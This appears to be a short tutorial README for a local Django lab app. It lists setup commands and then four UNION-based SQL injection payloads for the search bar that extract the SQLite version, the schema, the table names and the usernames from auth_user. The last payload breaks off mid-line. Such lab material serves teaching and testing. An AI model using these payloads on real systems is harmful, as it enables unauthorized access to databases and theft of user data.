How to perform a SQL Injection Attack

Steps

- Install any python IDE(e.g: Pycharm)
- Install Python
- Install SQLiteStudio
- pip install Django
- python manage.py makemigrations
- python manage.py migrate
- python manage.py runsever
- http://127.0.0.1:8000/items/search

Types of Sql injection attack attempted

1) Attack to get SQLite version(Run the below sql in the search bar)
Book' UNION SELECT sqlite_version();--

2) Attack to get column name extraction(Run the below sql in the search bar)
Book' union SELECT sql FROM sqlite_master 
WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%';--

3) Attack to get table name(Run the below sql in the search bar)
Book' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';--

4) Attack to get usernames(Run the below sql in the search bar)
abc' UNION SELECT username FROM auth_user WHERE username LIKE'